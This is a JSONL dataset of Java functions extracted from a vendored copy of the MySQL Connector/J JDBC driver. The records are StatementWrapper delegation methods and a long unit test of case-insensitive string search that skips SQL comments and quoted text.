{"docstring": "/*\n * (non-Javadoc)\n * \n * @see java.sql.Statement#executeBatch()\n */\n", "func_signal": "public int[] executeBatch() throws SQLException", "code": "{\n    try {\n        if (this.wrappedStmt != null) {\n            return this.wrappedStmt.executeBatch();\n        }\n\n        throw SQLError.createSQLException(\"Statement already closed\", SQLError.SQL_STATE_ILLEGAL_ARGUMENT, this.exceptionInterceptor);\n    } catch (SQLException sqlEx) {\n        checkAndFireConnectionError(sqlEx);\n    }\n\n    return null; // we actually never get here, but the compiler can't figure that out\n}", "path": "\u6280\u672f\u96be\u70b9\u89e3\u51b3\u65b9\u6848\\1_3.\u642d\u5efaSSH\u6846\u67b6\uff08JAVA\uff09\\\u8981\u989d\u5916\u5bfc\u5165\u7684\u5305\\mysql-connector-java-5.1.33\\mysql-connector-java-5.1.33\\src\\com\\mysql\\jdbc\\jdbc2\\optional\\StatementWrapper.java", "repo_name": "JamesonHuang/Graduation-Project", "stars": 99, "license": "None", "language": "java", "size": 736823}
{"docstring": "/*\n * (non-Javadoc)\n * \n * @see java.sql.Statement#setCursorName(java.lang.String)\n */\n", "func_signal": "public void setCursorName(String name) throws SQLException", "code": "{\n    try {\n        if (this.wrappedStmt != null) {\n            this.wrappedStmt.setCursorName(name);\n        } else {\n            throw SQLError.createSQLException(\"Statement already closed\", SQLError.SQL_STATE_ILLEGAL_ARGUMENT, this.exceptionInterceptor);\n        }\n    } catch (SQLException sqlEx) {\n        checkAndFireConnectionError(sqlEx);\n    }\n}", "path": "\u6280\u672f\u96be\u70b9\u89e3\u51b3\u65b9\u6848\\1_3.\u642d\u5efaSSH\u6846\u67b6\uff08JAVA\uff09\\\u8981\u989d\u5916\u5bfc\u5165\u7684\u5305\\mysql-connector-java-5.1.33\\mysql-connector-java-5.1.33\\src\\com\\mysql\\jdbc\\jdbc2\\optional\\StatementWrapper.java", "repo_name": "JamesonHuang/Graduation-Project", "stars": 99, "license": "None", "language": "java", "size": 736823}
{"docstring": "/*\n * (non-Javadoc)\n * \n * @see java.sql.Statement#getResultSetHoldability()\n */\n", "func_signal": "public int getResultSetHoldability() throws SQLException", "code": "{\n    try {\n        if (this.wrappedStmt != null) {\n            return this.wrappedStmt.getResultSetHoldability();\n        }\n\n        throw SQLError.createSQLException(\"Statement already closed\", SQLError.SQL_STATE_ILLEGAL_ARGUMENT, this.exceptionInterceptor);\n    } catch (SQLException sqlEx) {\n        checkAndFireConnectionError(sqlEx);\n    }\n\n    return Statement.CLOSE_CURRENT_RESULT;\n}", "path": "\u6280\u672f\u96be\u70b9\u89e3\u51b3\u65b9\u6848\\1_3.\u642d\u5efaSSH\u6846\u67b6\uff08JAVA\uff09\\\u8981\u989d\u5916\u5bfc\u5165\u7684\u5305\\mysql-connector-java-5.1.33\\mysql-connector-java-5.1.33\\src\\com\\mysql\\jdbc\\jdbc2\\optional\\StatementWrapper.java", "repo_name": "JamesonHuang/Graduation-Project", "stars": 99, "license": "None", "language": "java", "size": 736823}
{"docstring": "/*\n * (non-Javadoc)\n * \n * @see java.sql.Statement#getWarnings()\n */\n", "func_signal": "public SQLWarning getWarnings() throws SQLException", "code": "{\n    try {\n        if (this.wrappedStmt != null) {\n            return this.wrappedStmt.getWarnings();\n        }\n\n        throw SQLError.createSQLException(\"Statement already closed\", SQLError.SQL_STATE_ILLEGAL_ARGUMENT, this.exceptionInterceptor);\n    } catch (SQLException sqlEx) {\n        checkAndFireConnectionError(sqlEx);\n    }\n\n    return null;\n}", "path": "\u6280\u672f\u96be\u70b9\u89e3\u51b3\u65b9\u6848\\1_3.\u642d\u5efaSSH\u6846\u67b6\uff08JAVA\uff09\\\u8981\u989d\u5916\u5bfc\u5165\u7684\u5305\\mysql-connector-java-5.1.33\\mysql-connector-java-5.1.33\\src\\com\\mysql\\jdbc\\jdbc2\\optional\\StatementWrapper.java", "repo_name": "JamesonHuang/Graduation-Project", "stars": 99, "license": "None", "language": "java", "size": 736823}
{"docstring": "/*\n * (non-Javadoc)\n * \n * @see java.sql.Statement#clearBatch()\n */\n", "func_signal": "public void clearBatch() throws SQLException", "code": "{\n    try {\n        if (this.wrappedStmt != null) {\n            this.wrappedStmt.clearBatch();\n        }\n    } catch (SQLException sqlEx) {\n        checkAndFireConnectionError(sqlEx);\n    }\n}", "path": "\u6280\u672f\u96be\u70b9\u89e3\u51b3\u65b9\u6848\\1_3.\u642d\u5efaSSH\u6846\u67b6\uff08JAVA\uff09\\\u8981\u989d\u5916\u5bfc\u5165\u7684\u5305\\mysql-connector-java-5.1.33\\mysql-connector-java-5.1.33\\src\\com\\mysql\\jdbc\\jdbc2\\optional\\StatementWrapper.java", "repo_name": "JamesonHuang/Graduation-Project", "stars": 99, "license": "None", "language": "java", "size": 736823}
{"docstring": "/*\n * (non-Javadoc)\n * \n * @see java.sql.Statement#setFetchDirection(int)\n */\n", "func_signal": "public void setFetchDirection(int direction) throws SQLException", "code": "{\n    try {\n        if (this.wrappedStmt != null) {\n            this.wrappedStmt.setFetchDirection(direction);\n        } else {\n            throw SQLError.createSQLException(\"Statement already closed\", SQLError.SQL_STATE_ILLEGAL_ARGUMENT, this.exceptionInterceptor);\n        }\n    } catch (SQLException sqlEx) {\n        checkAndFireConnectionError(sqlEx);\n    }\n}", "path": "\u6280\u672f\u96be\u70b9\u89e3\u51b3\u65b9\u6848\\1_3.\u642d\u5efaSSH\u6846\u67b6\uff08JAVA\uff09\\\u8981\u989d\u5916\u5bfc\u5165\u7684\u5305\\mysql-connector-java-5.1.33\\mysql-connector-java-5.1.33\\src\\com\\mysql\\jdbc\\jdbc2\\optional\\StatementWrapper.java", "repo_name": "JamesonHuang/Graduation-Project", "stars": 99, "license": "None", "language": "java", "size": 736823}
{"docstring": "/*\n * (non-Javadoc)\n * \n * @see java.sql.Statement#executeUpdate(java.lang.String)\n */\n", "func_signal": "public int executeUpdate(String sql) throws SQLException", "code": "{\n    try {\n        if (this.wrappedStmt != null) {\n            return this.wrappedStmt.executeUpdate(sql);\n        }\n\n        throw SQLError.createSQLException(\"Statement already closed\", SQLError.SQL_STATE_ILLEGAL_ARGUMENT, this.exceptionInterceptor);\n    } catch (SQLException sqlEx) {\n        checkAndFireConnectionError(sqlEx);\n    }\n\n    return -1; // we actually never get here, but the compiler can't figure that out\n}", "path": "\u6280\u672f\u96be\u70b9\u89e3\u51b3\u65b9\u6848\\1_3.\u642d\u5efaSSH\u6846\u67b6\uff08JAVA\uff09\\\u8981\u989d\u5916\u5bfc\u5165\u7684\u5305\\mysql-connector-java-5.1.33\\mysql-connector-java-5.1.33\\src\\com\\mysql\\jdbc\\jdbc2\\optional\\StatementWrapper.java", "repo_name": "JamesonHuang/Graduation-Project", "stars": 99, "license": "None", "language": "java", "size": 736823}
{"docstring": "/**\n * Tests StringUtil.indexOfIgnoreCase() methods\n * \n * @throws Exception\n */\n", "func_signal": "public void testIndexOfIgnoreCase() throws Exception", "code": "{\n    final String markerStart = \"\\\"'`(\";\n    final String markerEnd = \"\\\"'`)\";\n\n    String searchIn;\n    String[] searchInMulti;\n    String searchFor;\n    String[] searchForMulti;\n    int[] expectedIdx;\n\n    int pos;\n    Set<SearchMode> searchMode;\n\n    /*\n     * A. test indexOfIgnoreCase(String searchIn, String searchFor)\n     */\n    // basic test set\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(null, null));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(null, \"abc\"));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(\"abc\", null));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(\"abc\", \"\"));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(\"abc\", \"bcd\"));\n    assertEquals(0, StringUtils.indexOfIgnoreCase(\"abc\", \"abc\"));\n    assertEquals(3, StringUtils.indexOfIgnoreCase(\"abc d efg\", \" d \"));\n\n    // exhaustive test set\n    searchIn = \"A strange STRONG SsStRiNg to be searched in\";\n    searchForMulti = new String[] { \"STR\", \"sstr\", \"Z\", \"a str\", \" in\", \"b\" };\n    expectedIdx = new int[] { 2, 18, -1, 0, 40, 29 };\n    for (int i = 0; i < searchForMulti.length; i++) {\n        assertEquals(\"Test A.\" + i, expectedIdx[i], StringUtils.indexOfIgnoreCase(searchIn, searchForMulti[i]));\n    }\n\n    /*\n     * B. test indexOfIgnoreCase(int startingPosition, String searchIn, String searchFor)\n     */\n    // basic test set\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(3, null, null));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(3, null, \"abc\"));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(3, \"abc\", null));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(3, \"abc\", \"\"));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(3, \"abc\", \"bcd\"));\n    assertEquals(3, StringUtils.indexOfIgnoreCase(3, \"abcabc\", \"abc\"));\n    assertEquals(3, StringUtils.indexOfIgnoreCase(\"abc d efg\", \" d \"));\n\n    // exhaustive test set\n    searchIn = \"A strange STRONG SsStRiNg to be searched in\";\n    searchForMulti = new String[] { \"STR\", \"sstr\", \"Z\", \"a str\", \" in\", \"b\" };\n    expectedIdx = new int[] { 10, 18, -1, -1, 40, 29 };\n    for (int i = 0; i < searchForMulti.length; i++) {\n        assertEquals(\"Test B.\" + i, expectedIdx[i], StringUtils.indexOfIgnoreCase(3, searchIn, searchForMulti[i]));\n    }\n\n    /*\n     * C. test indexOfIgnoreCase(int startingPosition, String searchIn, String searchFor, String openingMarkers, String closingMarkers, Set<SearchMode>\n     * searchMode) using search modes SEARCH_MODE__BSESC_MRK_WS or SEARCH_MODE__MRK_WS\n     */\n    // basic test set\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, null, (String) null, markerStart, markerEnd, StringUtils.SEARCH_MODE__BSESC_MRK_WS));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, null, \"abc\", markerStart, markerEnd, StringUtils.SEARCH_MODE__BSESC_MRK_WS));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, \"abc\", (String) null, markerStart, markerEnd, StringUtils.SEARCH_MODE__BSESC_MRK_WS));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, \"abc\", \"\", markerStart, markerEnd, StringUtils.SEARCH_MODE__BSESC_MRK_WS));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, \"abc\", \"bcd\", markerStart, markerEnd, StringUtils.SEARCH_MODE__BSESC_MRK_WS));\n    assertEquals(6, StringUtils.indexOfIgnoreCase(0, \"ab -- abc\", \"abc\", markerStart, markerEnd, StringUtils.SEARCH_MODE__BSESC_MRK_WS));\n    assertEquals(5, StringUtils.indexOfIgnoreCase(0, \"ab # abc\", \"abc\", markerStart, markerEnd, StringUtils.SEARCH_MODE__BSESC_MRK_WS));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, \"ab/*/* /c\", \"abc\", markerStart, markerEnd, StringUtils.SEARCH_MODE__BSESC_MRK_WS));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, \"ab/**/c\", \"abc\", markerStart, markerEnd, StringUtils.SEARCH_MODE__BSESC_MRK_WS));\n    assertEquals(5, StringUtils.indexOfIgnoreCase(0, \"ab/* abc */c\", \"abc\", markerStart, markerEnd, StringUtils.SEARCH_MODE__BSESC_MRK_WS));\n    assertEquals(0, StringUtils.indexOfIgnoreCase(0, \"abc\", \"abc\", markerStart, markerEnd, StringUtils.SEARCH_MODE__BSESC_MRK_WS));\n    assertEquals(3, StringUtils.indexOfIgnoreCase(0, \"abc d efg\", \" d \", markerStart, markerEnd, StringUtils.SEARCH_MODE__BSESC_MRK_WS));\n\n    // exhaustive test set\n    searchInMulti = new String[] { \"A \\\"strange \\\"STRONG SsStRiNg to be searched in\", \"A 'strange 'STRONG SsStRiNg to be searched in\",\n            \"A `strange `STRONG SsStRiNg to be searched in\", \"A (strange )STRONG SsStRiNg to be searched in\" };\n    searchForMulti = new String[] { \"STR\", \"sstr\", \"Z\", \"a str\", \" in\", \"b\" };\n    expectedIdx = new int[] { 12, 20, -1, -1, 42, 31 };\n    for (int i = 0; i < searchForMulti.length; i++) {\n        for (int j = 0; j < searchInMulti.length; j++) {\n            // multiple markers\n            assertEquals(\"Test C.\" + j + \".\" + i, expectedIdx[i],\n                    StringUtils.indexOfIgnoreCase(0, searchInMulti[j], searchForMulti[i], markerStart, markerEnd, StringUtils.SEARCH_MODE__MRK_WS));\n            assertEquals(\"Test C.\" + j + \".\" + i, expectedIdx[i],\n                    StringUtils.indexOfIgnoreCase(0, searchInMulti[j], searchForMulti[i], markerStart, markerEnd, StringUtils.SEARCH_MODE__BSESC_MRK_WS));\n\n            // single marker\n            assertEquals(\"Test C.\" + j + \".\" + i, expectedIdx[i], StringUtils.indexOfIgnoreCase(0, searchInMulti[j], searchForMulti[i],\n                    markerStart.substring(j, j + 1), markerEnd.substring(j, j + 1), StringUtils.SEARCH_MODE__MRK_WS));\n            assertEquals(\"Test C.\" + j + \".\" + i, expectedIdx[i], StringUtils.indexOfIgnoreCase(0, searchInMulti[j], searchForMulti[i],\n                    markerStart.substring(j, j + 1), markerEnd.substring(j, j + 1), StringUtils.SEARCH_MODE__BSESC_MRK_WS));\n        }\n    }\n\n    searchIn = \"A (`'\\\"strange \\\"'`)STRONG SsStRiNg to be searched in\";\n    searchForMulti = new String[] { \"STR\", \"sstr\", \"Z\", \"a str\", \" in\", \"b\" };\n    expectedIdx = new int[] { 18, 26, -1, -1, 48, 37 };\n    for (int i = 0; i < searchForMulti.length; i++) {\n        // multiple markers\n        assertEquals(\"Test C.4.\" + i, expectedIdx[i],\n                StringUtils.indexOfIgnoreCase(0, searchIn, searchForMulti[i], markerStart, markerEnd, StringUtils.SEARCH_MODE__BSESC_MRK_WS));\n        // single marker\n        assertEquals(\"Test C.5.\" + i, expectedIdx[i],\n                StringUtils.indexOfIgnoreCase(0, searchIn, searchForMulti[i], \"'\", \"'\", StringUtils.SEARCH_MODE__BSESC_MRK_WS));\n    }\n\n    searchIn = \"A 'strange \\\\''STRONG \\\\`SsSTRING\\\\\\\" to be searched in\";\n    searchForMulti = new String[] { \"STR\", \"sstr\", \"Z\", \"a str\", \" in\", \"b\" };\n    expectedIdx = new int[] { 14, 24, -1, -1, 48, 37 };\n    for (int i = 0; i < searchForMulti.length; i++) {\n        // multiple markers\n        assertEquals(\"Test C.6.\" + i, expectedIdx[i],\n                StringUtils.indexOfIgnoreCase(0, searchIn, searchForMulti[i], markerStart, markerEnd, StringUtils.SEARCH_MODE__BSESC_MRK_WS));\n        // single marker\n        assertEquals(\"Test C.7.\" + i, expectedIdx[i],\n                StringUtils.indexOfIgnoreCase(0, searchIn, searchForMulti[i], \"'\", \"'\", StringUtils.SEARCH_MODE__BSESC_MRK_WS));\n    }\n\n    /*\n     * D. test indexOfIgnoreCase(int startingPosition, String searchIn, String searchFor, String openingMarkers, String closingMarkers, Set<SearchMode>\n     * searchMode) using combined and single search modes\n     */\n    // basic test set\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, null, (String) null, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, null, \"abc\", markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, \"abc\", (String) null, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, \"abc\", \"\", markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, \"abc\", \"bcd\", markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, \"ab -- abc\", \"abc\", markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, \"ab # abc\", \"abc\", markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, \"ab/*/* /c\", \"abc\", markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, \"ab/**/c\", \"abc\", markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, \"ab/* abc */c\", \"abc\", markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(0, StringUtils.indexOfIgnoreCase(0, \"abc\", \"abc\", markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(3, StringUtils.indexOfIgnoreCase(0, \"abc d efg\", \" d \", markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n\n    // exhaustive test set\n    searchIn = \"/* MySQL01 *//* MySQL02 */ \\\"MySQL03\\\" /* MySQL04 */-- MySQL05\\n/* MySQL06 *//* MySQL07 */ 'MySQL08' /* MySQL09 */-- # MySQL10\\r\\n\"\n            + \"/* MySQL11 *//* MySQL12 */ `MySQL13` /* MySQL14 */# MySQL15\\r\\n/* MySQL16 *//* MySQL17 */ (MySQL18) /* MySQL19 */# -- MySQL20 \\n\"\n            + \"/* MySQL21 *//* MySQL22 */ \\\\MySQL23--;/*! MySQL24 */ MySQL25 --\";\n    searchFor = \"mYSql\";\n\n    // 1. different markers in method arguments\n    pos = StringUtils.indexOfIgnoreCase(0, searchIn, searchFor, null, null, StringUtils.SEARCH_MODE__BSESC_COM_WS);\n    assertEquals(3, testIndexOfIgnoreCaseMySQLIndexMarker(searchIn, pos));\n    pos = StringUtils.indexOfIgnoreCase(0, searchIn, searchFor, \"\", \"\", StringUtils.SEARCH_MODE__ALL);\n    assertEquals(3, testIndexOfIgnoreCaseMySQLIndexMarker(searchIn, pos));\n    pos = StringUtils.indexOfIgnoreCase(0, searchIn, searchFor, \"'`(\", \"'`)\", StringUtils.SEARCH_MODE__ALL);\n    assertEquals(3, testIndexOfIgnoreCaseMySQLIndexMarker(searchIn, pos));\n    pos = StringUtils.indexOfIgnoreCase(0, searchIn, searchFor, \"\\\"`(\", \"\\\"`)\", StringUtils.SEARCH_MODE__ALL);\n    assertEquals(8, testIndexOfIgnoreCaseMySQLIndexMarker(searchIn, pos));\n    pos = StringUtils.indexOfIgnoreCase(0, searchIn, searchFor, \"\\\"'(\", \"\\\"')\", StringUtils.SEARCH_MODE__ALL);\n    assertEquals(13, testIndexOfIgnoreCaseMySQLIndexMarker(searchIn, pos));\n    pos = StringUtils.indexOfIgnoreCase(0, searchIn, searchFor, \"\\\"'`\", \"\\\"'`\", StringUtils.SEARCH_MODE__ALL);\n    assertEquals(18, testIndexOfIgnoreCaseMySQLIndexMarker(searchIn, pos));\n\n    // 2a. search mode: all but skip markers\n    searchMode = StringUtils.SEARCH_MODE__BSESC_COM_WS;\n    pos = 0;\n    expectedIdx = new int[] { 3, 8, 13, 18, 24, 25, -1 };\n    for (int i = 0; i < expectedIdx.length; i++, pos++) {\n        pos = StringUtils.indexOfIgnoreCase(pos, searchIn, searchFor, markerStart, markerEnd, searchMode);\n        assertEquals(\"Test D.2a.\" + i, expectedIdx[i], testIndexOfIgnoreCaseMySQLIndexMarker(searchIn, pos));\n    }\n    // 2b. search mode: only skip markers\n    searchMode = EnumSet.of(SearchMode.SKIP_BETWEEN_MARKERS);\n    pos = 0;\n    expectedIdx = new int[] { 1, 2, 4, 5, 6, 7, 9, 10, 11, 12, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, -1 };\n    for (int i = 0; i < expectedIdx.length; i++, pos++) {\n        pos = StringUtils.indexOfIgnoreCase(pos, searchIn, searchFor, markerStart, markerEnd, searchMode);\n        assertEquals(\"Test D.2b.\" + i, expectedIdx[i], testIndexOfIgnoreCaseMySQLIndexMarker(searchIn, pos));\n    }\n\n    // 3a. search mode: all but skip line comments\n    searchMode = EnumSet\n            .of(SearchMode.ALLOW_BACKSLASH_ESCAPE, SearchMode.SKIP_BETWEEN_MARKERS, SearchMode.SKIP_BLOCK_COMMENTS, SearchMode.SKIP_WHITE_SPACE);\n    pos = 0;\n    expectedIdx = new int[] { 5, 10, 15, 20, 24, 25, -1 };\n    for (int i = 0; i < expectedIdx.length; i++, pos++) {\n        pos = StringUtils.indexOfIgnoreCase(pos, searchIn, searchFor, markerStart, markerEnd, searchMode);\n        assertEquals(\"Test D.3a.\" + i, expectedIdx[i], testIndexOfIgnoreCaseMySQLIndexMarker(searchIn, pos));\n    }\n    // 3b. search mode: only skip line comments\n    searchMode = EnumSet.of(SearchMode.SKIP_LINE_COMMENTS);\n    pos = 0;\n    expectedIdx = new int[] { 1, 2, 3, 4, 6, 7, 8, 9, 11, 12, 13, 14, 16, 17, 18, 19, 21, 22, 23, 24, 25, -1 };\n    for (int i = 0; i < expectedIdx.length; i++, pos++) {\n        pos = StringUtils.indexOfIgnoreCase(pos, searchIn, searchFor, markerStart, markerEnd, searchMode);\n        assertEquals(\"Test D.3b.\" + i, expectedIdx[i], testIndexOfIgnoreCaseMySQLIndexMarker(searchIn, pos));\n    }\n\n    // 4a. search mode: all but skip block comments\n    searchMode = EnumSet.of(SearchMode.ALLOW_BACKSLASH_ESCAPE, SearchMode.SKIP_BETWEEN_MARKERS, SearchMode.SKIP_LINE_COMMENTS, SearchMode.SKIP_WHITE_SPACE);\n    pos = 0;\n    expectedIdx = new int[] { 1, 2, 4, 6, 7, 9, 11, 12, 14, 16, 17, 19, 21, 22, 24, 25, -1 };\n    for (int i = 0; i < expectedIdx.length; i++, pos++) {\n        pos = StringUtils.indexOfIgnoreCase(pos, searchIn, searchFor, markerStart, markerEnd, searchMode);\n        assertEquals(\"Test D.4a.\" + i, expectedIdx[i], testIndexOfIgnoreCaseMySQLIndexMarker(searchIn, pos));\n    }\n    // 4b. search mode: only skip block comments\n    searchMode = EnumSet.of(SearchMode.SKIP_BLOCK_COMMENTS);\n    pos = 0;\n    expectedIdx = new int[] { 3, 5, 8, 10, 13, 15, 18, 20, 23, 24, 25, -1 };\n    for (int i = 0; i < expectedIdx.length; i++, pos++) {\n        pos = StringUtils.indexOfIgnoreCase(pos, searchIn, searchFor, markerStart, markerEnd, searchMode);\n        assertEquals(\"Test D.4b.\" + i, expectedIdx[i], testIndexOfIgnoreCaseMySQLIndexMarker(searchIn, pos));\n    }\n\n    // 5a. search mode: all but allow backslash escape\n    pos = StringUtils.indexOfIgnoreCase(0, searchIn, searchFor, markerStart, markerEnd, StringUtils.SEARCH_MODE__MRK_COM_WS);\n    assertEquals(23, testIndexOfIgnoreCaseMySQLIndexMarker(searchIn, pos));\n    // 5b. search mode: only allow backslash escape\n    searchMode = EnumSet.of(SearchMode.ALLOW_BACKSLASH_ESCAPE);\n    pos = 0;\n    expectedIdx = new int[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, -1 };\n    for (int i = 0; i < expectedIdx.length; i++, pos++) {\n        pos = StringUtils.indexOfIgnoreCase(pos, searchIn, searchFor, markerStart, markerEnd, searchMode);\n        assertEquals(\"Test D.5b.\" + i, expectedIdx[i], testIndexOfIgnoreCaseMySQLIndexMarker(searchIn, pos));\n    }\n\n    // 6. all together\n    pos = 0;\n    expectedIdx = new int[] { 24, 25, -1 };\n    for (int i = 0; i < expectedIdx.length; i++, pos++) {\n        pos = StringUtils.indexOfIgnoreCase(pos, searchIn, searchFor, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL);\n        assertEquals(\"Test D.6.\" + i, expectedIdx[i], testIndexOfIgnoreCaseMySQLIndexMarker(searchIn, pos));\n    }\n    pos = StringUtils.indexOfIgnoreCase(0, searchIn, \"YourSQL\", markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL);\n    assertEquals(-1, testIndexOfIgnoreCaseMySQLIndexMarker(searchIn, pos));\n\n    // 7. none\n    pos = 0;\n    for (int i = 1; i <= 25; i++, pos++) {\n        pos = StringUtils.indexOfIgnoreCase(pos, searchIn, searchFor, markerStart, markerEnd, StringUtils.SEARCH_MODE__NONE);\n        assertEquals(\"Test D.7.\" + i, i, testIndexOfIgnoreCaseMySQLIndexMarker(searchIn, pos));\n    }\n    pos = StringUtils.indexOfIgnoreCase(pos + 1, searchIn, searchFor, markerStart, markerEnd, StringUtils.SEARCH_MODE__NONE);\n    assertEquals(-1, testIndexOfIgnoreCaseMySQLIndexMarker(searchIn, pos));\n    pos = StringUtils.indexOfIgnoreCase(0, searchIn, \"YourSQL\", markerStart, markerEnd, StringUtils.SEARCH_MODE__NONE);\n    assertEquals(-1, testIndexOfIgnoreCaseMySQLIndexMarker(searchIn, pos));\n\n    /*\n     * E. test indexOfIgnoreCase(int startingPosition, String searchIn, String searchFor, String openingMarkers, String closingMarkers, Set<SearchMode>\n     * searchMode) illegal markers arguments\n     */\n    assertThrows(IllegalArgumentException.class,\n            \"Illegal argument value null for openingMarkers and/or - for closingMarkers. These cannot be null and must have the same length.\",\n            new Callable<Void>() {\n                public Void call() throws Exception {\n                    StringUtils.indexOfIgnoreCase(0, \"abc\", \"abc\", null, \"-\", EnumSet.of(SearchMode.SKIP_BETWEEN_MARKERS));\n                    return null;\n                }\n            });\n    assertThrows(IllegalArgumentException.class,\n            \"Illegal argument value - for openingMarkers and/or null for closingMarkers. These cannot be null and must have the same length.\",\n            new Callable<Void>() {\n                public Void call() throws Exception {\n                    StringUtils.indexOfIgnoreCase(0, \"abc\", \"abc\", \"-\", null, EnumSet.of(SearchMode.SKIP_BETWEEN_MARKERS));\n                    return null;\n                }\n            });\n    assertThrows(IllegalArgumentException.class,\n            \"Illegal argument value null for openingMarkers and/or null for closingMarkers. These cannot be null and must have the same length.\",\n            new Callable<Void>() {\n                public Void call() throws Exception {\n                    StringUtils.indexOfIgnoreCase(0, \"abc\", \"abc\", null, null, EnumSet.of(SearchMode.SKIP_BETWEEN_MARKERS));\n                    return null;\n                }\n            });\n    assertThrows(IllegalArgumentException.class,\n            \"Illegal argument value - for openingMarkers and/or -! for closingMarkers. These cannot be null and must have the same length.\",\n            new Callable<Void>() {\n                public Void call() throws Exception {\n                    StringUtils.indexOfIgnoreCase(0, \"abc\", \"abc\", \"-\", \"-!\", EnumSet.of(SearchMode.SKIP_BETWEEN_MARKERS));\n                    return null;\n                }\n            });\n\n    /*\n     * F. test indexOfIgnoreCase(int startingPosition, String searchIn, String searchFor, String openingMarkers, String closingMarkers, Set<SearchMode>\n     * searchMode) special cases\n     */\n    // unclosed, unopened or nested block comments\n    searchMode = EnumSet.of(SearchMode.SKIP_BLOCK_COMMENTS);\n    searchIn = \"one * /* two /* * / three /*/*/ four * /\";\n    searchForMulti = new String[] { \"one\", \"two\", \"three\", \"four\" };\n    expectedIdx = new int[] { 0, -1, -1, 32 };\n    for (int i = 0; i < searchForMulti.length; i++) {\n        assertEquals(\"Test F.1.\" + i, expectedIdx[i], StringUtils.indexOfIgnoreCase(0, searchIn, searchForMulti[i], markerStart, markerEnd, searchMode));\n    }\n    searchMode = EnumSet.of(SearchMode.ALLOW_BACKSLASH_ESCAPE, SearchMode.SKIP_BETWEEN_MARKERS, SearchMode.SKIP_LINE_COMMENTS, SearchMode.SKIP_WHITE_SPACE);\n    expectedIdx = new int[] { 0, 9, 20, 32 };\n    for (int i = 0; i < searchForMulti.length; i++) {\n        assertEquals(\"Test F.2.\" + i, expectedIdx[i], StringUtils.indexOfIgnoreCase(0, searchIn, searchForMulti[i], markerStart, markerEnd, searchMode));\n    }\n\n    // double quoted escapes, including some \"noise\" chars\n    searchMode = EnumSet.of(SearchMode.SKIP_BETWEEN_MARKERS);\n    searchIn = \"one 'two\\\" ''three''' four\\\"\";\n    searchForMulti = new String[] { \"one\", \"two\", \"three\", \"four\" };\n    expectedIdx = new int[] { 0, -1, -1, 21 };\n    for (int i = 0; i < searchForMulti.length; i++) {\n        assertEquals(\"Test F.3.\" + i, expectedIdx[i], StringUtils.indexOfIgnoreCase(0, searchIn, searchForMulti[i], markerStart, markerEnd, searchMode));\n    }\n    searchMode = StringUtils.SEARCH_MODE__BSESC_COM_WS;\n    expectedIdx = new int[] { 0, 5, 12, 21 };\n    for (int i = 0; i < searchForMulti.length; i++) {\n        assertEquals(\"Test F.4.\" + i, expectedIdx[i], StringUtils.indexOfIgnoreCase(0, searchIn, searchForMulti[i], markerStart, markerEnd, searchMode));\n    }\n\n    // nested different opening/closing marker, including some \"noise\" chars\n    searchMode = EnumSet.of(SearchMode.SKIP_BETWEEN_MARKERS);\n    searchIn = \"one (two\\\"( (three''')) )four)\";\n    searchForMulti = new String[] { \"one\", \"two\", \"three\", \"four\" };\n    expectedIdx = new int[] { 0, -1, -1, 24 };\n    for (int i = 0; i < searchForMulti.length; i++) {\n        assertEquals(\"Test F.5.\" + i, expectedIdx[i], StringUtils.indexOfIgnoreCase(0, searchIn, searchForMulti[i], markerStart, markerEnd, searchMode));\n    }\n    searchMode = StringUtils.SEARCH_MODE__BSESC_COM_WS;\n    expectedIdx = new int[] { 0, 5, 12, 24 };\n    for (int i = 0; i < searchForMulti.length; i++) {\n        assertEquals(\"Test F.6.\" + i, expectedIdx[i], StringUtils.indexOfIgnoreCase(0, searchIn, searchForMulti[i], markerStart, markerEnd, searchMode));\n    }\n\n    /*\n     * G. test indexOfIgnoreCase(int startingPosition, String searchIn, String searchFor[], String openingMarkers, String closingMarkers, Set<SearchMode>\n     * searchMode) using all combined search modes\n     */\n    // basic test set\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, null, (String[]) null, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(-1, 